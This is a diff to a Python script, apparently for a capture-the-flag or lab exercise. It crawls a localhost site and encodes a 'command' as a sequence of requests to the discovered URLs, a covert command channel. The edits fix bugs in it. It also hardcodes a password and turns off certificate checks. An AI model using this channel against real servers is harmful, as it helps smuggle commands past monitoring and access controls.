@@ -8,6 +8,7 @@ base_dict = {}
 
 # from http://interactivepython.org/courselib/static/pythonds/Recursion/pythondsConvertinganIntegertoaStringinAnyBase.html
 def toStr(c):
+	global n
 	if type(c) == str :
 		c = ord(c)
 	if c < n:
@@ -32,11 +33,11 @@ def send_request(url):
     content = requests.get(url, headers=headers, timeout=1, stream=True, verify=False)
     return content
 
-def send_encoded(command,url) :
+def send_encoded(url,command) :
 	for c in command :
 		c = toStr(c)
 		for x in c :
-			send_request(url+base_dict[c])
+			send_request(url+base_dict[x])
 
 		send_request(url) # EOC, End Of Character
 
@@ -92,6 +93,7 @@ def spider(url,path) :
 			spider(url,group)
 
 def main() :
+	global n
 	URL = "http://localhost:8080"	
 	PATH  = ""
 	password = "4ll1g4t0r5uX"
@@ -100,9 +102,8 @@ def main() :
 
 	checked_urls_list = list(checked_urls)
 	checked_urls_list.sort() 
-
 	n = len(checked_urls_list)
-
+	print n
 	for i in range(n) :
 		base_dict[convertString[i]] = checked_urls_list[i]
 
